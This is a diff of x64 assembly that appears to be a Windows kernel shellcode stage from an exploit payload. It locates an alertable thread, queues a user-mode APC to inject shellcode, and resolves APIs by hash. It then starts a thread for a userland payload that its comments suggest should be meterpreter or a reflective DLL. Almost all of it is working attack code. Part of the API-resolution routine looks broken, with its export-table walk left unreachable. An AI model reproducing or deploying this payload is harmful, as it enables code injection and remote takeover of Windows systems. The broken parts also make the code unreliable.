+  sub rdx, r12                                          ; sub offset
+  push rcx
+  push rdx
+  mov rcx, rdx
+
+  sub rsp, 0x20
+  mov r11d, PSGETTHREADTEB_HASH
+  call x64_block_api_direct
+  add rsp, 0x20
+
+  pop rdx
+  pop rcx
+
+  test rax, rax                                          ; check if TEB is NULL
+  je _x64_find_alertable_thread_skip_next
+
+  mov rax, qword [rax + TEB_ACTIVATIONCONTEXTSTACKPOINTER_OFFSET]
+  test rax, rax
+  je _x64_find_alertable_thread_skip_next
+
+  add rdx, ETHREAD_ALERTABLE_OFFSET
+  mov eax, dword [rdx]
+  bt eax, 0x5
+  jb _x64_find_alertable_thread_found
+
+_x64_find_alertable_thread_skip_next:
+  mov rcx, [rcx]
+  jmp _x64_find_alertable_thread_loop
+
+_x64_find_alertable_thread_found:
+  sub rdx, ETHREAD_ALERTABLE_OFFSET
+  mov r12, rdx
+
+x64_create_apc:
+  ; ExAllocatePool(POOL_TYPE.NonPagedPool, 0x90);
+  xor edx, edx
+  add dl, 0x90
+  xor ecx, ecx
+  mov r11d, EXALLOCATEPOOL_HASH
+  call x64_block_api_direct
+
+  ;mov r12, rax
+  ;mov r11d, KEGETCURRENTTHREAD_HASH
+  ;call x64_block_api_direct
+
+; KeInitializeApc(rcx = apc,
+;                 rdx = pThread,
+;                 r8 = NULL = OriginalApcEnvironment,
+;                 r9 = KernelApcRoutine,
+;                 NULL,
+;                 InjectionShellCode,
+;                 1 /* UserMode */,
+;                 NULL /* Context */);
+  mov rcx, rax                                ; pool APC
+  lea r9, [rcx + 0x80]                        ; dummy kernel APC function
+  mov byte [r9], 0xc3                         ; ret
+
+  mov rdx, r12                                ; pThread;
+  mov r12, rax                                ; save APC
+  xor r8, r8                                  ; OriginalApcEnvironment = NULL
+
+  push r8                                     ; Context = NULL
+  push 0x1                                    ; UserMode
+  mov rax, [r14]
+  push rax                                    ; userland shellcode
+  push r8                                     ; NULL
+
+  sub rsp, 0x20
+  mov r11d, KEINITIALIZEAPC_HASH
+  call x64_block_api_direct
+
+  ; KeInsertQueueApc(pAPC, NULL, NULL, NULL);
+  xor edx, edx
+  push rdx
+  push rdx
+  pop r8
+  pop r9
+  mov rcx, r12
+
+  mov r11d, KEINSERTQUEUEAPC_HASH
+  call x64_block_api_direct
+
+x64_kernel_exit_cleanup:
+  ; KeUnstackDetachProcess(pApcState)
+  mov rcx, r13
+  mov r11d, KEUNSTACKDETACHPROCESS_HASH
+  call x64_block_api_direct
+
+  ; ObDereferenceObject(PEPROCESS)
+  mov rcx, rbx
+  mov r11d, OBDEREFERENCEOBJECT_HASH
+  call x64_block_api_direct
+
+x64_kernel_exit:
+
+  mov rsp, rbp                           ; fix stack
+
+  pop rbp
+
+  pop rbx
+  pop r12
+  pop r13
+  pop r14
+  pop r15
+  pop rsi                               ; restore clobbered registers and return
+
+  ret
+
 userland_start:
-userland_start_thread:
-    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
-    xchg rdx, rax   ; rdx is CreateThread address passed from kernel
-    xor ecx, ecx    ; lpThreadAttributes = NULL
-    push rcx        ; lpThreadId = NULL
-    push rcx        ; dwCreationFlags = 0
-    mov r9, rcx     ; lpParameter = NULL
-    lea r8, [rel userland_payload]  ; lpStartAddr
-    mov edx, ecx    ; dwStackSize = 0
-    sub rsp, 0x20
-    call rax
-    add rsp, 0x30
-    ret
-    
+
+x64_userland_start:
+
+  jmp x64_userland_start_thread
+
+; user and kernel mode re-use this code
+x64_calc_hash:
+  xor r9, r9
+
+_x64_calc_hash_loop:
+  xor eax, eax
+  lodsb                                 ; Read in the next byte of the ASCII function name
+  ror r9d, 13                           ; Rotate right our hash value
+  cmp al, 'a'
+  jl _x64_calc_hash_not_lowercase
+  sub al, 0x20                          ; If so normalise to uppercase
+_x64_calc_hash_not_lowercase:
+  add r9d, eax                          ; Add the next byte of the name
+  cmp al, ah                            ; Compare AL to AH (\0)
+  jne _x64_calc_hash_loop
+
+  ret
+
+x64_block_find_dll:
+  xor edx, edx
+  mov rdx, [gs:rdx + 96]
+  mov rdx, [rdx + 24]         ; PEB->Ldr
+  mov rdx, [rdx + 32]         ; InMemoryOrder list
+
+_x64_block_find_dll_next_mod:
+  mov rdx, [rdx]
+  mov rsi, [rdx + 80]         ; unicode string
+  movzx rcx, word [rdx + 74]  ; rcx = len
+
+  xor r9d, r9d
+
+_x64_block_find_dll_loop_mod_name:
+  xor eax, eax
+  lodsb
+  cmp al, 'a'
+  jl _x64_block_find_dll_not_lowercase
+  sub al, 0x20
+
+_x64_block_find_dll_not_lowercase:
+  ror r9d, 13
+  add r9d, eax
+  loop _x64_block_find_dll_loop_mod_name
+
+  cmp r9d, r11d
+  jnz _x64_block_find_dll_next_mod
+
+  mov r15, [rdx + 32]
+  ret
+
+x64_block_api_direct:
+
+  mov rax, r15                                        ; make copy of module
+
+  shl rdi,3
+
+  mov rax ,qword [0xffffffffffd00010+rdi]   
+
+  jmp rax               ; Get export tables RVA
+
+%ifdef ERROR_CHECKS
+  ; test rax, rax                                     ; EAT not found
+  ; jz _block_api_not_found
+%endif
+
+  add rax, rdx
+  push rax                                            ; save EAT
+
+  mov ecx, dword [rax+24]                             ; NumberOfFunctions
+  mov r8d, dword [rax+32]                             ; FunctionNames
+  add r8, rdx
+
+_x64_block_api_direct_get_next_func:
+                              ; When we reach the start of the EAT (we search backwards), we hang or crash
+  dec rcx                     ; decrement NumberOfFunctions
+  mov esi, dword [r8+rcx*4]   ; Get rva of next module name
+  add rsi, rdx                ; Add the modules base address
+
+  call x64_calc_hash
+
+  cmp r9d, r11d                             ; Compare the hashes
+  jnz _x64_block_api_direct_get_next_func   ; try the next function
+
+
+_x64_block_api_direct_finish:
+
+  pop rax                     ; restore EAT
+  mov r8d, dword [rax+36]
+  add r8, rdx                 ; ordinate table virtual address
+  mov cx, [r8+2*rcx]          ; desired functions ordinal
+  mov r8d, dword [rax+28]     ; Get the function addresses table rva
+  add r8, rdx                 ; Add the modules base address
+  mov eax, dword [r8+4*rcx]   ; Get the desired functions RVA
+  add rax, rdx                ; Add the modules base address to get the functions actual VA
+
+  pop rsi
+  pop rcx
+  pop rdx
+  pop r8
+  pop r9
+  pop r11                     ; pop ret addr
+
+  ; sub rsp, 0x20               ; shadow space
+  push r11                    ; push ret addr
+
+  jmp rax
+
+
+x64_userland_start_thread:
+  push rsi
+  push r15
+  push rbp
+
+  mov rbp, rsp
+  sub rsp, 0x20
+
+  mov r11d, KERNEL32_DLL_HASH
+  call x64_block_find_dll
+
+  xor ecx, ecx
+
+  push rcx
+  push rcx
+
+  push rcx                                    ; lpThreadId = NULL
+  push rcx                                    ; dwCreationFlags = 0
+  pop r9                                      ; lpParameter = NULL
+  lea r8, [rel userland_payload]              ; lpStartAddr = &threadstart
+  pop rdx                                     ; lpThreadAttributes = NULL
+
+  sub rsp, 0x20
+  mov r11d, CREATETHREAD_HASH                 ; hash("CreateThread")
+  call x64_block_api_direct                   ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL);
+
+  mov rsp, rbp
+  pop rbp
+  pop r15
+  pop rsi
+  ret
+
+userland_payload_size:
+  db 0x01
+  db 0x00
+
 userland_payload:
-    nop
-    nop
-    nop
+  ; insert userland payload here
+  ; such as meterpreter
+  ; or reflective dll with the metasploit MZ pre-stub
+  
